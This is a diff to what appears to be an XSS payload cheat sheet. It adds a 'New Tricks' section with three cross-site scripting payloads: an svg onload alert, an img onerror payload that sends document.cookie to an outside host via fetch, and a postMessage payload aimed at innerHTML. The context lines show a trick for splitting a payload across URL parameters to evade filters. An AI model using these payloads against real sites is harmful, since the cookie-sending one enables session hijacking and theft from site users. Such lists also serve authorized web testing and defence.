@@ -95,3 +95,17 @@
                 2. you can ditribute your payload over the inputs:
                     1. [https://myapp.com/account.php?page_id=”](https://myapp.com/account.php?page_id=%E2%80%9D)><script>/_&seed=_/alert(document .cookie);/_&mode=_/</script>
     4. Change request method
+
+## New Tricks
+
+### Trick 1
+- Scenario: Reflected XSS in search rendered unsanitized query parameter.
+- Payload: `<svg/onload=alert(document.domain)>`
+
+### Trick 2
+- Scenario: Stored XSS in markdown preview bypassed weak HTML sanitizer.
+- Payload: `<img src=x onerror=fetch("https://x.tld/?c="+document.cookie)>`
+
+### Trick 3
+- Scenario: postMessage sink converted attacker data directly into innerHTML.
+- Payload: `window.postMessage("<img src=x onerror=alert(1)>","*")`
